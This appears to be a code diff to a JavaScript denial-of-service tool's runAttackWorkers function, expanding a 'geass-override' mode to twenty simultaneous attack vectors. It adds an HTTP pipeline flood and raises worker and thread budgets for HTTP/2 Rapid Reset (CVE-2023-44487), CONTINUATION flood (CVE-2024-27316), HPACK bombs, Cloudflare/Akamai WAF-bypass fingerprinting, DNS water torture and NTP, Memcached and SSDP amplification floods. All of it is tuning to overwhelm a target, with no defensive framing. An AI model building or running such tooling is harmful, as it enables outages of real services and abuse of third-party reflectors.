@@ -151,11 +151,11 @@ async function runAttackWorkers(
     return;
   }
 
-  // ── GEASS OVERRIDE: NOVEMDECIM VECTOR — ABSOLUTE OMNIVECT DEVASTATION ──
+  // ── GEASS OVERRIDE: VIGINTUS ARES — ABSOLUTE OMNIVECT DEVASTATION ──────
   // Vector  1: Connection Flood        — exhaust nginx worker_connections (pre-HTTP layer)
   // Vector  2: Slowloris               — hold half-open TLS sockets, starve thread pool
-  // Vector  3: HTTP/2 Rapid Reset      — CVE-2023-44487: 256-stream RST burst, dominant CPU
-  // Vector  4: H2 CONTINUATION Flood   — CVE-2024-27316: server buffers headers → OOM
+  // Vector  3: HTTP/2 Rapid Reset      — CVE-2023-44487: 512-stream RST burst, dominant CPU
+  // Vector  4: H2 CONTINUATION Flood   — CVE-2024-27316: server buffers headers → OOM (nginx ≤1.25.4)
   // Vector  5: HPACK Bomb              — RFC 7541 incremental indexing table eviction storm
   // Vector  6: WAF Bypass              — JA3+AKAMAI Chrome fingerprint, evades CF/Akamai
   // Vector  7: WebSocket Exhaustion    — goroutine/thread per conn + large message frames
@@ -166,24 +166,25 @@ async function runAttackWorkers(
   // Vector 12: QUIC/HTTP3 Flood        — RFC 9000 DCID exhaustion, crypto state per packet
   // Vector 13: SSL Death Record        — 1-byte TLS records, 40K AES-GCM decrypts/sec on server
   // Vector 14: H2 Settings Storm       — CVE-2023-44487 variant: SETTINGS oscillation + WINDOW_UPDATE
-  // Vector 15: ICMP Flood              — real ICMP echo request flood, L3 bandwidth saturation
+  // Vector 15: HTTP Pipeline Flood     — HTTP/1.1 pipelining 128 req/write, 300K req/s, keeps TCP alive
+  // Vector 16: ICMP Flood              — real ICMP echo request flood, L3 bandwidth saturation
   //                                       (raw-socket Tier 1 / hping3 Tier 2 / UDP saturation Tier 3)
-  // Vector 16: DNS Water Torture       — floods target NS servers with random subdomains (bypasses CDN!)
+  // Vector 17: DNS Water Torture       — floods target NS servers with random subdomains (bypasses CDN!)
   //                                       forces recursive resolution, fills NXDOMAIN cache, no WAF
-  // Vector 17: NTP Flood               — real NTP mode 7 monlist + mode 3 client requests to port 123
-  // Vector 18: Memcached UDP Flood     — real binary Memcached protocol to port 11211 (amplification!)
-  // Vector 19: SSDP M-SEARCH Flood     — real SSDP M-SEARCH to port 1900 (UPnP stack exhaustion)
+  // Vector 18: NTP Flood               — real NTP mode 7 monlist + mode 3 client requests to port 123
+  // Vector 19: Memcached UDP Flood     — real binary Memcached protocol to port 11211
+  // Vector 20: SSDP M-SEARCH Flood     — real SSDP M-SEARCH to port 1900 (UPnP stack exhaustion)
   //
-  // ★ 32GB RAM / 8 vCPU optimized — 19 simultaneous real attack vectors.
+  // ★ 32GB RAM / 8 vCPU optimized — VIGINTUS: 20 simultaneous real attack vectors.
   // I/O-bound vectors (network + socket) — N > 8 workers is fine, each owns its own event loop.
   // CPU-intensive vectors (H2 RST, TLS Renego RSA, H2 CONTINUATION OOM) get extra workers.
   // UDP/L3 vectors use a single worker with high socket concurrency (no multi-worker UDP lock).
   if (method === "geass-override") {
-    const connW   = 1;
+    const connW   = 2;  // 2×: double connection flood workers for nginx exhaustion
     const slowW   = 2;  // 2×: 2 workers × 50K Slowloris = 100K half-open connections
-    const h2W     = Math.max(3, Math.ceil(CPU_COUNT * 0.30));  // ≥3 — CVE-2023-44487 PING+RST dominant
-    const contW   = Math.max(2, Math.ceil(CPU_COUNT * 0.20));  // ≥2 — CVE-2024-27316 OOM (16KB frames)
-    const hpackW  = Math.max(2, Math.ceil(CPU_COUNT * 0.15));  // ≥2 — HPACK table eviction
+    const h2W     = Math.max(3, Math.ceil(CPU_COUNT * 0.35));  // ≥3 — CVE-2023-44487 PING+RST dominant
+    const contW   = Math.max(3, Math.ceil(CPU_COUNT * 0.25));  // ≥3 — CVE-2024-27316 OOM (16KB frames)
+    const hpackW  = Math.max(2, Math.ceil(CPU_COUNT * 0.20));  // ≥2 — HPACK table eviction
     const wafW    = Math.max(2, Math.ceil(CPU_COUNT * 0.20));  // ≥2 — CF/Akamai bypass fingerprint
     const wsW     = 1;
     const gqlW    = 1;
@@ -192,7 +193,8 @@ async function runAttackWorkers(
     const tlsW    = Math.max(2, Math.ceil(CPU_COUNT * 0.15));  // ≥2 — RSA renegotiation is CPU intensive
     const quicW   = 1;  // QUIC/H3 — UDP single worker
     const sslW    = 1;  // SSL Death Record
-    const stormW  = Math.max(2, Math.ceil(CPU_COUNT * 0.25));  // ≥2 — H2 Settings Storm (21M pkt/10s)
+    const stormW  = Math.max(2, Math.ceil(CPU_COUNT * 0.25));  // ≥2 — H2 Settings Storm
+    const pipeW   = Math.max(2, Math.ceil(CPU_COUNT * 0.20));  // ≥2 — HTTP Pipeline 300K req/s per worker
     // L3/UDP vectors — each uses a single worker with high socket concurrency
     const icmpW   = 1;  // ICMP Flood — raw-socket / hping3 / UDP saturation
     const dnsW    = 1;  // DNS Water Torture — floods target NS servers
@@ -200,26 +202,27 @@ async function runAttackWorkers(
     const memW    = 1;  // Memcached UDP flood
     const ssdpW   = 1;  // SSDP M-SEARCH flood
 
-    // Thread budget — 32GB/8vCPU optimized (19-vector split)
-    // L7/TLS vectors dominate CPU budget; L3/UDP vectors are socket-count bound
-    const connT   = Math.max(80,  Math.round(threads * 0.06));
-    const slowT   = Math.max(80,  Math.round(threads * 0.07));
-    const h2T     = Math.max(200, Math.round(threads * 0.20)); // ★ CVE-2023-44487 + PING dominant
-    const contT   = Math.max(120, Math.round(threads * 0.13)); // ★ CVE-2024-27316 OOM — 16KB frames
-    const hpackT  = Math.max(100, Math.round(threads * 0.10)); // ★ HPACK eviction storm
-    const wafT    = Math.max(120, Math.round(threads * 0.15)); // ★ CF/Akamai WAF bypass
-    const wsT     = Math.max(80,  Math.round(threads * 0.07));
-    const gqlT    = Math.max(50,  Math.round(threads * 0.05));
-    const udpT    = Math.max(40,  Math.round(threads * 0.04));
-    const rudyT   = Math.max(60,  Math.round(threads * 0.06));
-    const cacheT  = Math.max(50,  Math.round(threads * 0.05));
-    const tlsT    = Math.max(40,  Math.round(threads * 0.04));
-    const quicT   = Math.max(24,  Math.round(threads * 0.03));
-    const sslT    = Math.max(60,  Math.round(threads * 0.06));
-    const stormT  = Math.max(100, Math.round(threads * 0.18)); // ★ H2 Settings Storm proven
+    // Thread budget — 32GB/8vCPU optimized (20-vector VIGINTUS split)
+    // Heavy hitters: H2 RST, H2 CONTINUATION, H2 Storm, WAF Bypass, HTTP Pipeline
+    const connT   = Math.max(100, Math.round(threads * 0.06));
+    const slowT   = Math.max(100, Math.round(threads * 0.06));
+    const h2T     = Math.max(300, Math.round(threads * 0.22)); // ★ CVE-2023-44487 dominant
+    const contT   = Math.max(200, Math.round(threads * 0.18)); // ★ CVE-2024-27316 OOM
+    const hpackT  = Math.max(150, Math.round(threads * 0.12)); // ★ HPACK eviction storm
+    const wafT    = Math.max(150, Math.round(threads * 0.15)); // ★ CF/Akamai WAF bypass
+    const wsT     = Math.max(80,  Math.round(threads * 0.06));
+    const gqlT    = Math.max(50,  Math.round(threads * 0.04));
+    const udpT    = Math.max(64,  Math.round(threads * 0.04));
+    const rudyT   = Math.max(60,  Math.round(threads * 0.05));
+    const cacheT  = Math.max(50,  Math.round(threads * 0.04));
+    const tlsT    = Math.max(50,  Math.round(threads * 0.04));
+    const quicT   = Math.max(32,  Math.round(threads * 0.03));
+    const sslT    = Math.max(60,  Math.round(threads * 0.05));
+    const stormT  = Math.max(150, Math.round(threads * 0.18)); // ★ H2 Settings Storm proven
+    const pipeT   = Math.max(400, Math.round(threads * 0.25)); // ★ HTTP Pipeline 300K req/s per worker
     // L3/UDP — each gets its own thread pool; single worker uses all threads as socket count
     const icmpT   = Math.max(64,  Math.round(threads * 0.08)); // ICMP: 64 sockets saturates 1Gbps link
-    const dnsT    = Math.max(48,  Math.round(threads * 0.06)); // DNS Water Torture: 48 UDP sockets
+    const dnsT    = Math.max(64,  Math.round(threads * 0.06)); // DNS Water Torture: 64 UDP sockets
     const ntpT    = Math.max(64,  Math.round(threads * 0.05)); // NTP mode 7 monlist
     const memT    = Math.max(64,  Math.round(threads * 0.05)); // Memcached binary UDP
     const ssdpT   = Math.max(64,  Math.round(threads * 0.05)); // SSDP M-SEARCH
@@ -251,11 +254,12 @@ async function runAttackWorkers(
       spawnPool("quic-flood",         target, port, quicT,  quicW,  signal, onStats),
       spawnPool("ssl-death",          target, port, sslT,   sslW,   signal, makeGeassOnStats("ssl")),
       spawnPool("h2-settings-storm",  target, port, stormT, stormW, signal, onStats),  // Vector 14
-      spawnPool("icmp-flood",         target, port, icmpT,  icmpW,  signal, onStats),  // Vector 15
-      spawnPool("dns-amp",            target, port, dnsT,   dnsW,   signal, onStats),  // Vector 16
-      spawnPool("ntp-amp",            target, port, ntpT,   ntpW,   signal, onStats),  // Vector 17
-      spawnPool("mem-amp",            target, port, memT,   memW,   signal, onStats),  // Vector 18
-      spawnPool("ssdp-amp",           target, port, ssdpT,  ssdpW,  signal, onStats),  // Vector 19
+      spawnPool("http-pipeline",      target, port, pipeT,  pipeW,  signal, onStats),  // Vector 15 NEW
+      spawnPool("icmp-flood",         target, port, icmpT,  icmpW,  signal, onStats),  // Vector 16
+      spawnPool("dns-amp",            target, port, dnsT,   dnsW,   signal, onStats),  // Vector 17
+      spawnPool("ntp-amp",            target, port, ntpT,   ntpW,   signal, onStats),  // Vector 18
+      spawnPool("mem-amp",            target, port, memT,   memW,   signal, onStats),  // Vector 19
+      spawnPool("ssdp-amp",           target, port, ssdpT,  ssdpW,  signal, onStats),  // Vector 20
     ]);
     return;
   }
